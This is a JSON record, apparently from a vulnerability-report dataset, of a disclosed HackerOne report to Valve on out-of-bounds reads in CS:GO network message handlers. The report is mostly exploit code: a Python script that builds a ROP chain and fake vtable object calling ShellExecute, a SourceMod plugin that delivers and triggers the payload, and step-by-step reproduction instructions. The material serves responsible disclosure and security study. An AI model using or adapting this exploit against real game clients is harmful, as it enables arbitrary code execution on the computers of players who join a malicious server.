{
  "reported_to": "Valve",
  "reported_by": "slidybat ",
  "title": "OOB reads in network message handlers leads to RCE",
  "content": "\nVulnerability\nIn Source engine games there are many network messages sent from the server to the client that take an entity index. There is a common pattern among many of these messages for the lower bounds of the entity index to be checked but not the upper bounds. In many cases these out of bound reads get an entity pointer from that index then call a virtual function on it.\nAs an example, here is the handler for the CS:GO GlowPropTurnOff message:\nCode 333 Bytes\n1bool _MsgFunc_GlowPropTurnOff(CCSUserMsg_GlowPropTurnOff* msg)\n2{\n3  CBaseEntity* entity = nullptr;\n4\n5  int ent_idx = msg->ent_index;\n6  if ( ent_idx >= 0 && entitylist[ent_idx] != nullptr )\n7  {\n8    CBaseHandle* handle = entitylist[ent_idx]\n9    entity = handle->GetBaseEntity();  // A virtual function\n10  }\n11  \n12  // ...\n13  \n14  return true;\n15}\nExploiting the vulnerability\nI will be discussing the GlowPropTurnOff message specifically for the remainder of this report, however this OOB read pattern exists in other messages too. I have successfully tested this on a couple of other CS:GO user messages, and while I haven't tested it I also suspect that this bug pattern exists in the network messages of other Source games as well.\nThis is the assembly used to access the entitylist array:\nCode 108 Bytes\n1mov     eax, ent_idx\n2test    eax, eax\n3js      short loc_103B77A2\n4shl     eax, 4\n5mov     ecx, entitylist[eax]\nThe index is shifted left by 4 bits (shl eax, 4) before being used to access entitylist. This means that we can supply a large positive number that will overflow to a negative number, allowing us to return a pointer to pretty much anywhere in the module. Our goal will be to supply an index that returns a pointer to some memory that we control on the client. This memory will have the required vtable set up so that when handle->GetBaseEntity() is called it will call an address that we control.\nFollowing a writeup of a similar bug (https://insomnihack.ch/wp-content/uploads/2017/04/AC_remote_exploitation_of_valve_source.pdf), I chose to use the ShowMenu message to set up the needed memory on the client. The ShowMenu message takes the menu_string supplied from the server, converts it to UTF16, and stores it in a global string variable wchar_t g_szMenuString[512].\nI wrote the following Python script to generate the payload needed to send through the ShowMenu message to set up a fake object with a valid vtable and also includes the ROP chain needed to pop calc:\nCode 3.21 KiB\n1from pwn import *\n2import textwrap\n3\n4BASE_ADDRESS        = 0x287E0000\n5FAKE_OBJ            = BASE_ADDRESS + 0x3174F3C\n6\n7SHELL_EXECUTE_ADDR  = BASE_ADDRESS + 0xA8F244\n8\n9GADGET_XCHG_EAX_ESP = BASE_ADDRESS + 0xA2AAD1\n10GADGET_POP_ESP      = BASE_ADDRESS + 0x7E031C\n11GADGET_POP_EAX      = BASE_ADDRESS + 0x4a925\n12GADGET_POP_EDI      = BASE_ADDRESS + 0x2f00C6\n13GADGET_MOV_EAX_EDI  = BASE_ADDRESS + 0x74215\n14GADGET_MOV_EAX_EAX  = BASE_ADDRESS + 0x73c92\n15GADGET_XOR_EAX_EAX  = BASE_ADDRESS + 0xb4279\n16GADGET_XCHG_EAX_EDI = BASE_ADDRESS + 0x1da80f\n17\n18def to_unicode(dword):\n19    a = dword & 0xffff;\n20    b = dword >> 16;\n21    return eval('u\"\\\\u%s\\\\u%s\"' % (hex(a)[2:].zfill(4), hex(b)[2:].zfill(4)))\n22\n23def write(addr, value):\n24    rop = u''\n25    rop += to_unicode(GADGET_POP_EAX)\n26    rop += to_unicode(addr)\n27    rop += to_unicode(GADGET_POP_EDI)\n28    rop += to_unicode(value)\n29    rop += to_unicode(GADGET_MOV_EAX_EDI)\n30    return rop\n31\n32def write_deref(addr, to_deref):\n33    rop = u''\n34    rop += to_unicode(GADGET_POP_EAX)\n35    rop += to_unicode(to_deref)\n36    rop += to_unicode(GADGET_MOV_EAX_EAX)\n37    rop += to_unicode(GADGET_POP_EDI)\n38    rop += to_unicode(addr)\n39    rop += to_unicode(GADGET_XCHG_EAX_EDI)\n40    rop += to_unicode(GADGET_MOV_EAX_EDI)\n41    return rop\n42\n43def write_zero(addr):\n44    rop = u''\n45    rop += to_unicode(GADGET_XOR_EAX_EAX)\n46    rop += to_unicode(GADGET_POP_EDI)\n47    rop += to_unicode(addr)\n48    rop += to_unicode(GADGET_XCHG_EAX_EDI)\n49    rop += to_unicode(GADGET_MOV_EAX_EDI)\n50    return rop\n51\n52def stack_pivot(addr):\n53    rop = u''\n54    rop += to_unicode(GADGET_POP_ESP)\n55    rop += to_unicode(addr)\n56    return rop\n57\n58rop = ''\n59\n60open_str_addr = FAKE_OBJ + 400\n61rop += write(open_str_addr, u32('open'))\n62\n63calc_str_addr = FAKE_OBJ + 420\n64rop += write(calc_str_addr, u32('calc'))\n65\n66# Move stack somewhere where it can safely not overwrite our fake object as functions are called\n67params_addr = FAKE_OBJ + 1000000\n68rop += write_deref(params_addr, SHELL_EXECUTE_ADDR)\n69rop += write(params_addr + 4, 0x41414141)\n70rop += write_zero(params_addr + 8)\n71rop += write(params_addr + 12, open_str_addr)\n72rop += write(params_addr + 16, calc_str_addr)\n73rop += write_zero(params_addr + 20)\n74rop += write_zero(params_addr + 24)\n75rop += write_zero(params_addr + 28)\n76rop += stack_pivot(params_addr)\n77\n78# Fake object structure\n79#  0 - pointer to actual object (#1)\n80#  1 - pointer to vtable        (#2)\n81#  2 - pointer to `pop esp`           <-- start of vtable, and where eax will be pointing once #9 is called\n82#  3 - pointer to full stack    (#10) <-- This will move the stack to somewhere where we have more room \n83#  4 - junk\n84#  5 - junk\n85#  6 - junk\n86#  7 - junk\n87#  8 - junk\n88#  9 - ptr to `xchg eax, esp`         <-- address that is initially jumped to, will set esp to #2 so we can pivot stack & begin ROP chain\n89# 10 - stack                          <-- where our ROP chain begins\n90fakeobj = u''\n91fakeobj += '--'\n92fakeobj += to_unicode(FAKE_OBJ + 4)\n93fakeobj += to_unicode(FAKE_OBJ + 4 * 2)\n94fakeobj += to_unicode(GADGET_POP_ESP)\n95fakeobj += to_unicode(FAKE_OBJ + 4 * 10)\n96fakeobj += u'\\u4141\\u4141'\n97fakeobj += u'\\u4242\\u4242'\n98fakeobj += u'\\u4343\\u4343'\n99fakeobj += u'\\u4444\\u4444'\n100fakeobj += u'\\u4545\\u4545'\n101fakeobj += to_unicode(GADGET_XCHG_EAX_ESP)\n102fakeobj += rop\n103\n104fakeobj = fakeobj.encode('utf-8')\n105\n106print(''.join(['\\\\x%02x' % ord(c) for c in fakeobj]))\nNote: As in #470520 the script above needs to know the base address of the client's client_panorama.dll module in order to be 100% reliable, however it isn't possible to this due to ASLR.\nNext, this payload needs to be sent to the client. I did this using the following SourceMod plugin:\nCode 705 Bytes\n1#include <sdktools>\n2\n3public void OnPluginStart()\n4{\n5\tHookEvent( \"player_spawn\", Event_PlayerSpawn );\n6}\n7\n8public Action Event_PlayerSpawn( Event event, const char[] name, bool dontBroadcast )\n9{\n10    int client = GetClientOfUserId( event.GetInt( \"userid\" ) );\n11\t\n12\t{\n13\t\tchar payload[] = \"PLACE PAYLOAD HERE\";\n14\t\n15\t\tProtobuf msg = UserMessageToProtobuf( StartMessageOne( \"ShowMenu\", client ) );\n16\t\tmsg.SetInt( \"bits_valid_slots\", 0xFFFFFFFF );\n17\t\tmsg.SetInt( \"display_time\", 0 );\n18\t\tmsg.SetString( \"menu_string\", payload );\n19\t\tEndMessage();\n20\t}\n21\t\n22\t{\n23\t\tProtobuf msg = UserMessageToProtobuf( StartMessageOne( \"GlowPropTurnOff\", client ) );\n24\t\tmsg.SetInt( \"entidx\", 0xfe43167 );\n25\t\tEndMessage();\n26\t}\n27\n28\treturn Plugin_Continue;\n29}\nOnce a client connects the payload is set up using the ShowMenu message and then is triggered immediately after with the GlowPropTurnOff message, resulting in calc being popped.\nPoC\nReproduction steps\n1) Start CS:GO and note the base address of client_panorama.dll\n2) Replace the value of BASE_ADDRESS in the Python script above with this base address value and run the script\n3) Copy the generated payload into the contents of the payload string in the SourceMod script above and compile the plugin\n4) Add the compiled plugin to the server and connect to this server with the client, as soon as the client is fully connected calc will be popped automatically\nImpact\nThis bug allows an attacker to execute arbitrary code on the computers of any clients that join their server.\n\n",
  "severity": [
    9.9,
    null
  ],
  "bounty": 7500,
  "weaknesses": [
    "Out-of-bounds Read"
  ],
  "screenshots": {},
  "disclosed_date": 1620102300,
  "report_url": "https://hackerone.com/reports/807772",
  "is_multi_component": true,
  "complexity": "HIGH",
  "novelty": "MEDIUM",
  "vuln_category": "API",
  "steps": [
    [
      1,
      "Start CS:GO and note the base address of client_panorama.dll"
    ],
    [
      2,
      "Replace the value of BASE_ADDRESS in the Python script with the noted base address and run the script"
    ],
    [
      3,
      "Copy the generated payload into the payload string in the SourceMod script and compile the plugin"
    ],
    [
      4,
      "Add the compiled plugin to the server and connect to this server with the client to trigger the exploit"
    ]
  ],
  "vuln_description": "The vulnerability involves an out-of-bounds read in network message handlers in Source engine games, specifically in CS:GO. By exploiting this, an attacker can execute arbitrary code on client machines through carefully crafted network messages that manipulate memory addresses and virtual function calls.",
  "reason": "This vulnerability requires deep understanding of memory manipulation, virtual function calls, and network message handling in the Source engine. The attacker must craft a precise payload to control memory and execute arbitrary code, involving multiple complex steps and interactions between different components of the game's network and memory systems.",
  "new_complexity": "VERY_HIGH",
  "requires_code": true,
  "requires_CVE": false,
  "is_ctf": false,
  "other_report": "470520"
}